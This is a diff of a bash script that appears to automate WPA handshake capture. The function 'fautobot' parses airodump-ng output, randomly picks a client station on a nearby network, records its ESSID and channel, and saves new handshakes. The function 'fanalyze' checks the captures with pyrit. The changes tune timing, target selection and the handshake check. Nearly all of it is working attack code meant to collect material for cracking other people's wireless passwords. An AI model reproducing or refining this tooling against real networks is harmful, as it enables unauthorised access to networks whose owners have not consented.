@@ -24,25 +24,14 @@ fautobot()																#Automagically find active clients and collect new han
 	LNUM=0
 	while [ $DONE -z ] 2> /dev/null
 		do
-			sleep 0.5
+			sleep 0.3
 			echo "$(cat $HOME/tmp-01.csv | grep 'Station' -A 20 | grep ':' | cut -d ',' -f 6)" > $HOME/tmp3
-			cat $HOME/tmp3 | tr -d '(not associated)' | sed '/^$/d' | sort -uR > $HOME/tmp2
-					while read LINE
-						do
-							case $LNUM in
-								1)BSSIDL=$LINE;;
-								2)BSSIDL=$LINE;;
-								3)BSSIDL=$LINE;;
-								4)BSSIDL=$LINE;;
-								5)BSSIDL=$LINE
-							esac
-							if [ $(cat $HOME/Desktop/cap/handshakes/got | grep $BSSIDL) -z ] 2> /dev/null
-								then
-									BSSID=$LINE
-							fi
-						done <$HOME/tmp2
-						
-			LNUM=$((LNUM + 1))
+			cat $HOME/tmp3 | tr -d '(not associated)' | sed '/^$/d' | sort -u > $HOME/tmp2
+			BSSIDL=$(cat $HOME/tmp2 | sort -R | head -n 1)
+			if [ $(cat $HOME/Desktop/cap/handshakes/got | grep $BSSIDL) -z ] 2> /dev/null
+				then
+					BSSID=$BSSIDL
+			fi						
 			ESSID=$(cat $HOME/tmp-01.csv | grep "$BSSID" | grep WPA | cut -d ',' -f 14 | head -n 1)
 			ESSID=${ESSID:1}
 			CHAN=$(cat $HOME/tmp-01.csv | grep "$BSSID" | grep WPA | cut -d ',' -f 4 | head -n 1)
@@ -65,11 +54,6 @@ fautobot()																#Automagically find active clients and collect new han
 				then
 					DONE=""
 			fi
-			echo
-			echo $ESSID
-			echo $BSSID
-			echo $CHAN
-			echo $CLIE
 		done
 	killall airodump-ng
 	rm -rf $HOME/tmp*
@@ -126,20 +110,21 @@ fautobot()																#Automagically find active clients and collect new han
 
 fanalyze()
 {
-while [ $DONE2 -z ] 2> /dev/null
+	
+while [ $(echo $ISDONE | grep $BSSID) -z ] 2> /dev/null
 	do
 		ISDONE=$(pyrit -r $HOME/tmp1-01.cap analyze)
-		if [ $ISDONE -z ] 2> /dev/null
-			then
-				fanalyze
-		fi
-		echo "$ISDONE" > $HOME/tmp4
-		if [ $( cat $HOME/tmp4 | grep "Traceback") -z ] 2> /dev/null
+		if  [ $(echo $ISDONE | grep "$ESSID") -z ] 2> /dev/null
 			then
 				A=1
 			else
-				fanalyze
+				break
 		fi
+	done
+
+while [ $DONE2 -z ] 2> /dev/null
+	do
+		echo "$ISDONE" > $HOME/tmp4
 		if [ $( cat $HOME/tmp4 | grep "bad") -z ] 2> /dev/null
 			then
 				DONE2=1
